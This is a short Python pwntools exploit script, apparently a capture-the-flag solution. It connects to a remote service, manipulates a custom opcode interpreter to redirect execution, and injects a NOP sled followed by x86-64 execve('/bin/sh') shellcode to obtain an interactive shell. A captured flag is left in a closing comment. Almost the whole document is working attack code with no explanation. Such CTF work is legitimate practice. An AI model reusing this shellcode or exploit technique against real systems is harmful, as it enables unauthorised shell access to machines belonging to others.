from pwn import *

context(log_level="debug")

# p = process("./pwn2")
p = remote("106.75.37.31",23333)

p.recvuntil("ight!\n\n")

op_add_mv = chr((0xD70-0xb10)/8+43)
op_exit = chr((0xD40-0xb10)/8+43)
op_sub = chr((0xB28-0xb10)/8+43)
op_mov_l = chr((0xD20-0xb10)/8+43)


for x in range(0,23):
	p.sendline(op_sub)
for x in range(0,0x2f+2):
	p.sendline(op_add_mv)
for x in range(0,4):
	p.sendline(op_sub)

shellcode = "\x90"*60+"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.sendline(str(0x602080+40))
p.sendline(str(0x602080+40))
p.sendline(shellcode)
p.sendline(op_mov_l)
p.sendline(op_add_mv)

# gdb.attach(p,"b*0x400776\nc")
p.sendline(op_exit)
p.interactive()


#flag{53ed43a93ec84fe99ddbd33d5acf5284}